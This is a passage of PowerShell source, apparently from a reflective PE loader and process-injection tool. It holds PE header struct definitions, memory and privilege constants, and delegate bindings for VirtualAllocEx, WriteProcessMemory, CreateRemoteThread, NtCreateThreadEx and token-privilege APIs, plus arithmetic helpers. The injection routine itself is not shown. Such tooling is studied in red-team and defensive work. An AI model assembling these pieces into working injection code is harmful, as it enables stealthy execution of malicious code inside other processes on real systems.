        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressOrdinalAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressOrdinalDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressOrdinal = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressOrdinalAddr, $GetProcAddressOrdinalDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $GetProcAddressOrdinal
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
        $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
    
        $LocalFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $LocalFreeDelegate = Get-DelegateType @([IntPtr])
        $LocalFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LocalFreeAddr, $LocalFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name LocalFree -Value $LocalFree

        return $Win32Functions
    }
    #####################################

            
    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }
        
